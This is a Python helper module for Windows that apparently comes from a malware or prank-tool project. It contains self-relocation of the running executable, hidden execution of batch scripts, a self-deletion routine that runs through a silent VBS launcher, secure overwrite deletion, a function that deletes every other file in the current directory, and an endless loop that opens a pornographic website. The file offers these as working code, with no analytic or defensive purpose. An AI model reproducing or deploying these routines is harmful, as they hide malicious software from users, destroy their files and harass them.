import json
import re
import datetime
from pathlib import Path
import hashlib
import sys
import os
import psutil
import shutil
import subprocess
import tempfile

def fake_mutex_code(exe_name: str) -> bool:
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() == exe_name:
            return True
        
    return False

def get_file_hash(path):
    sha256_hash = hashlib.sha256()
    with open(path,"rb") as f:
        for byte_block in iter(lambda: f.read(16777216),b""):
            sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

def current_time(seconds_also=False):
    return datetime.datetime.now().strftime('%d.%m.%Y_%H.%M' if not seconds_also else '%d.%m.%Y_%H.%M.%S')

def tree(dir_path: Path, level: int=-1, limit_to_directories: bool=False, length_limit: int=sys.maxsize):
    global tree_files, tree_directories
    space =  '    '
    branch = '│   '
    tee =    '├── '
    last =   '└── '
    dir_path = Path(dir_path)
    level = int(-1)
    limit_to_directories = False
    def inner(dir_path: Path, prefix: str='', level=-1):
        global tree_files, tree_directories
        try:
            contents = list(dir_path.iterdir())
            pointers = [tee] * (len(contents) - 1) + [last]
            for pointer, path in zip(pointers, contents):
                if path.is_dir():
                    yield prefix + pointer + path.name
                    extension = branch if pointer == tee else space 
                    yield from inner(path, prefix=prefix+extension, level=level-1)
                elif not limit_to_directories:
                    yield prefix + pointer + path.name
        except Exception as err:
            print(err)
    return inner(dir_path, level=level)

def get_all_file_paths(directory):
    file_paths = []
    for root, directories, files in os.walk(directory):
        for filename in files:
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)
    return file_paths

def secure_delete_file(path, passes=1):
    length = os.path.getsize(path)
    with open(path, "br+", buffering=-1) as f:
        for i in range(passes):
            f.seek(0)
            f.write(os.urandom(length))
        f.close()
    os.remove(path)


def force_decode(b: bytes) -> str:
    """Force decode bytes to a string, handling Unicode errors."""
    try:
        return b.decode(json.detect_encoding(b))
    except UnicodeDecodeError:
        return b.decode(errors="backslashreplace")

def remove_non_ascii(input_data):
    if isinstance(input_data, str):
        return re.sub(r'[^\x00-\x7F]+', '', input_data)
    elif isinstance(input_data, set):
        # Convert set to a string representation and remove non-ASCII characters
        set_as_string = json.dumps(list(input_data))
        return re.sub(r'[^\x00-\x7F]+', '', set_as_string)
    else:
        raise TypeError("Input should be a string or a set")

def has_less_than(var, num_chars):
    """Check if the variable has fewer than num_chars characters."""
    if isinstance(var, str):
        return len(var) < num_chars
    else:
        return False  # Handle cases where var is not a string

def move_current_file(target_dir):
    # Determine the current file path
    current_file = os.path.realpath(sys.argv[0])  # This works for both .py and .exe
    
    # Ensure the target directory exists
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    # Construct the target path
    target_path = os.path.join(target_dir, os.path.basename(current_file))

    try:
        # For .py files, it might be better to copy and then delete the original
        if current_file.endswith('.py'):
            shutil.copy(current_file, target_path)
            print(f"Script copied to {target_path}")
            #os.remove(current_file)
            #print(f"Original script deleted from {current_file}")

        # For .exe files, attempt to move directly
        elif current_file.endswith('.exe'):
            shutil.move(current_file, target_path)
            print(f"Executable moved to {target_path}")

    except Exception as e:
        print(f"Failed to move file: {e}")

def run_batch_script_in_background(script_path):
    # Use the CREATE_NO_WINDOW flag to hide the console window
    CREATE_NO_WINDOW = 0x08000000

    try:
        subprocess.run(["cmd", "/c", script_path], creationflags=CREATE_NO_WINDOW)
        print(f"Batch script {script_path} executed in the background.")
    except Exception as e:
        print(f"Failed to execute batch script: {e}")


def save_code_to_batch_and_run(code, target_dir):
    # Define the path for the batch file
    batch_file_path = os.path.join(target_dir, "starts.bat")
    
    try:
        # Ensure the target directory exists
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        
        # Write the code to the batch file
        with open(batch_file_path, "w") as batch_file:
            batch_file.write(code)
        
        print(f"Batch file saved to {batch_file_path}")
        os.system(f"cd {target_dir} && start starts.bat")

    except Exception as e:
        print(f"Failed to save batch file: {e}")

def get_current_file_name():
    # For Python scripts, sys.argv[0] will contain the script name
    # For executables, sys.executable will contain the path to the executable
    current_file = sys.argv[0] if hasattr(sys, 'argv') and sys.argv else sys.executable

    # Extract the file name from the path
    file_name = os.path.basename(current_file)
    return file_name

def delete_self(current_file):
    print(f"Attempting to delete file: {current_file}")
    
    try:
        # Create a temporary batch file
        batch_file = tempfile.NamedTemporaryFile(delete=False, suffix='.bat')
        
        # Create a temporary VBS file
        vbs_file = tempfile.NamedTemporaryFile(delete=False, suffix='.vbs')
        
        # Write the batch script to delete the Python script, the batch file itself, and the VBS file
        with open(batch_file.name, 'w') as f:
            f.write(f"""
@echo off
ping 127.0.0.1 -n 3 > nul
del "{current_file}"
del "%~f0"
del "{vbs_file.name}"
""")
        
        # Write the VBS script to run the batch file silently
        with open(vbs_file.name, 'w') as f:
            f.write(f"""
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c {batch_file.name}", 0, False
""")
        
        # Close the temporary files
        batch_file.close()
        vbs_file.close()
        
        # Run the VBS file to execute the batch file silently
        os.system(f'cscript //nologo "{vbs_file.name}"')
    
    except Exception as e:
        print(f"An error occurred: {e}")

def delete_all_except(current_file_name):
    """
    Delete all files in the current directory except the specified file.
    
    Args:
        current_file_name (str): The name of the file to exclude from deletion.
    """
    try:
        # Get the current directory
        current_directory = os.getcwd()
        
        # List all files in the current directory
        files = os.listdir(current_directory)
        
        # Iterate through all files in the directory
        for file_name in files:
            # Check if the file is not the one to keep
            if file_name != current_file_name and os.path.isfile(file_name):
                try:
                    os.remove(file_name)
                    print(f"Deleted: {file_name}")
                except Exception as e:
                    print(f"Error deleting {file_name}: {e}")
                    
    except Exception as e:
        print(f"An error occurred: {e}")

def delete_file(file_path):
    """
    Delete a file specified by its file path.
    
    Args:
        file_path (str): The path to the file to delete.
    """
    try:
        if os.path.isfile(file_path):
            os.remove(file_path)
            print(f"Deleted: {file_path}")
        else:
            print(f"File not found: {file_path}")
    except Exception as e:
        print(f"An error occurred: {e}")

def extract_urls(text):
    """
    Extract all URLs from the given text.

    Parameters:
    - text: The input text from which to extract URLs.

    Returns:
    - A list of extracted URLs.
    """
    # Regular expression pattern to match URLs
    url_pattern = re.compile(
        r'(https?://(?:www\.|(?!www))[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|' 
        r'www\.[a-zA-Z0-9][a-zA-Z0-9-]+[a-zA-Z0-9]\.[^\s]{2,}|' 
        r'https?://(?:www\.|(?!www))[a-zA-Z0-9]+\.[^\s]{2,}|' 
        r'www\.[a-zA-Z0-9]+\.[^\s]{2,})'
    )
    
    # Find all URLs in the text
    urls = url_pattern.findall(text)
    
    return urls

def troll():
    while True:
        os.system('start pornhub.com')